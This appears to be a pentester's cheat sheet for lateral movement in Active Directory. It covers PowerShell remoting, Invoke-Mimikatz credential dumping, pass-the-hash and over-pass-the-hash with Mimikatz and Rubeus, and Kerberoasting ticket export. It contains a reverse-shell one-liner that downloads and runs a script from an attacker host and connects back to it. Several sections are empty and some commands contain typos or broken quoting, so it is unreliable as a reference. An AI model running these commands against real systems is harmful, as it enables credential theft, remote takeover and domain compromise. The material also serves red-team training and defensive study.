# AD - Lateral Movement / Connections

## **Basics**

**PowerShell Remoting**

* Its like psexec on steroids
* Enabled by default on Server 2012 and newer
* May need to enable remoting Enable-PSRemoting (admin privs required) e.g Win10
* You get an elevated shell if admin creds are use - so a lot of UAC Issues are not relevant
* Port 5985/5986 (SSL Encrypted) - is used (based on WinRM)
* One-To-One or One-To-Many (non-interactive, executes parallely)&#x20;
* Credentials are not left on target unless CredSSP/Unconstraned Delegation?
* Runs in process "wsmprovhost" and is stateful

## **Connections / PowerShellRemoting**

**Access C disk of a computer (check local admin)**\
ls \\\\\[hostname]\c$

**Connect to machine with administrator privs**\
****Enter-PSSession -Computername

**Save and use sessions of a machine**\
****$sess = New-PSSession -Computername hostname.local\
Enter-PSSession $sess

No local file be included in Enter-PSSession/New-PSSession

**Execute commands on a machine(s) (non-interactive)**

{% code overflow="wrap" %}
```powershell
Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}
Invoke-Command -Computername hostname -Scriptblock {$executioncontext.sessionstate.languagemode}
Invoke-Command -Scriptblock {whoami} -Computername (Get-Content <list-of-servers-file>) 
```
{% endcode %}

**Execute script on a machine**

{% code overflow="wrap" %}
```powershell
Invoke-Command -Computername (Get-Content <list-of-servers-file>) -FilePath  C:\scripty\a.ps1
❗Invoke-Command -FilePath C:\scripty\a.ps1 -Session $sess
   Enter-PSSession -Session $sess
   functionname_in_aps1
```
{% endcode %}



**Execute locally loaded function on a list of remote machines**

{% code overflow="wrap" %}
```powershell
Invoke-Command -Scriptblock ${function:test} -Computername (Get-Content <list_of_servers>)
❗Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)
A file/function test.ps1 is creatd and . .\test.ps1 With the content
function test
{
 Write-Output "Test" 
}
```
{% endcode %}

then run "test"  => Then we can run Invoke-Command -Scriptblock ${function:test} -Computername a\_host

**Execute locally loaded function on a list of remote machines & passing arguemnts (only positional arguments could be passed)**\
****

{% code overflow="wrap" %}
```powershell
Invoke-Command -ScriptBlock ${fucntion:getPassHashes} -Hostname a_host -ArgumentList

Use "Stateful" command using Invoke-Command:
$sess = New-PSSession -computername host1
Invoke-Command -session $sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -session $sess -ScriptBlock {$Proc.Name}
```
{% endcode %}

**Copy script to other server**

```powershell
Copy-Item .\Invoke-MimikatzEx.ps1 \\hostname\c$\'Program Files'
```

**Powershell reverse shell**

{% code overflow="wrap" %}
```powershell
powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
```
{% endcode %}

## Mimikatz - Invoke-Mimikatz

* Dump credentials, tickets, passing & replaying hashes
* Using the code from ReflectivePEInjection mimikatz is loaded reflectively into memory.
* Administrative Privilege is needed for reading/writing to lsass e.g. dumping creds

**Dump credentials on local/remote machine**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -DumpCreds   //default parameter
Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
```
{% endcode %}

**Write to lsass / "over pass the hash" - generate tokens from hashes (we have the hash for the User specified)**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /ntlm:<ntlmhash> /run:powershell.exe"'
```
{% endcode %}

Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.

## **🍳Kerberoasting**

### **Description**

### **Attack commands**

**See existing tickets**\
klist

**Remove all tickets**\
****klist purge

**Request a kerberos service ticket for a specific SPN - output Hashcat format**\
****Powerview - Request-SPNTicket -SPN "name/target.domain.local" \[-OutputFormat JTR]

**Manually**\
Add-Type -AssemblyName System.IdentityModel

{% code overflow="wrap" %}
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "name/target.domain.local"
```
{% endcode %}

**Dump the ticket**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
=> Now Crack
```
{% endcode %}



## ⏩Over-Pass the Hash

### Description



### Attack commands

{% code overflow="wrap" %}
```powershell
Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt

Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe'"
```
{% endcode %}





